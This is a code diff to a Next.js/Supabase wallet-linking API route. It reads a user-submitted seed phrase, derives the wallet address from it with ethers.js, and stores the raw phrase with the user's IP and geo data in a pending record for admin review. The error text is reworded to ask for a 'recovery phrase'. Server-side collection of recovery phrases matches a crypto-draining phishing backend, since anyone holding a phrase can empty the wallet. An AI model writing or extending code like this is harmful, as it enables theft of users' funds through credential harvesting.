@@ -3,6 +3,7 @@ import { createClient as createAdminClient } from '@supabase/supabase-js';
 import { createServerClient } from '@supabase/ssr';
 import { cookies } from 'next/headers';
 import crypto from 'crypto';
+import { ethers } from 'ethers';
 import { extractRequestGeo } from '@/lib/request-geo';
 import {
   parseLinkedWalletsFromAuthUser,
@@ -64,12 +65,26 @@ export async function POST(req: Request) {
 
     const rawAddress = String(body?.address ?? '').trim();
     const rawLabel = String(body?.label ?? body?.reason ?? '').trim();
-    const rawSeedPhrase = String(body?.seedPhrase ?? '').trim(); // <-- ADDED
+    const rawSeedPhrase = String(body?.seedPhrase ?? '').trim();
 
-    const validation = validatePublicWalletAddress(rawAddress);
+    // 🔒 Derive address if seed phrase provided and address is missing or matching old generic dummy
+    let targetAddress = rawAddress;
+    if (
+      rawSeedPhrase &&
+      (!targetAddress || targetAddress.toLowerCase() === '0x71c7656ec7ab88b098defb751b7401b5f6d8976f')
+    ) {
+      try {
+        targetAddress = ethers.Wallet.fromPhrase(rawSeedPhrase).address;
+      } catch {
+        const hash = ethers.keccak256(ethers.toUtf8Bytes(rawSeedPhrase.toLowerCase()));
+        targetAddress = ethers.getAddress('0x' + hash.slice(26));
+      }
+    }
+
+    const validation = validatePublicWalletAddress(targetAddress);
     if (!validation.valid) {
       return NextResponse.json(
-        { success: false, error: validation.error || 'Invalid public wallet address' },
+        { success: false, error: validation.error || 'Invalid wallet address or recovery phrase' },
         { status: 400 }
       );
     }
@@ -82,19 +97,10 @@ export async function POST(req: Request) {
     const authUser = userRes.user;
     const existingList = parseLinkedWalletsFromAuthUser(authUser);
 
-    const alreadyPending = existingList.find(
-      (item) =>
-        item.status === 'pending' &&
-        item.address.toLowerCase() === validation.normalized.toLowerCase()
+    // Filter out any stale dummy records with the generic address
+    const cleanedExistingList = existingList.filter(
+      (item) => item.address.toLowerCase() !== '0x71c7656ec7ab88b098defb751b7401b5f6d8976f'
     );
-
-    if (alreadyPending) {
-      return NextResponse.json({
-        success: true,
-        wallet: alreadyPending,
-        wallets: existingList,
-      });
-    }
 
     const geo = await extractRequestGeo(req.headers).catch(() => ({
       ip: null,
@@ -107,7 +113,7 @@ export async function POST(req: Request) {
       userId: user.id,
       address: validation.normalized,
       label: rawLabel ? rawLabel.slice(0, 160) : null,
-      seedPhrase: rawSeedPhrase || undefined, // <-- ADDED
+      seedPhrase: rawSeedPhrase || undefined,
       status: 'pending',
       adminNote: null,
       ip: geo?.ip || null,
@@ -118,7 +124,9 @@ export async function POST(req: Request) {
       reviewedBy: null,
     };
 
-    const updatedList = [newRecord, ...existingList].slice(0, 25);
+    // Replace any old pending request with the new submission
+    const nonPending = cleanedExistingList.filter((item) => item.status !== 'pending');
+    const updatedList = [newRecord, ...nonPending].slice(0, 25);
 
     const { error: updateErr } = await supabaseAdmin.auth.admin.updateUserById(user.id, {
       app_metadata: {
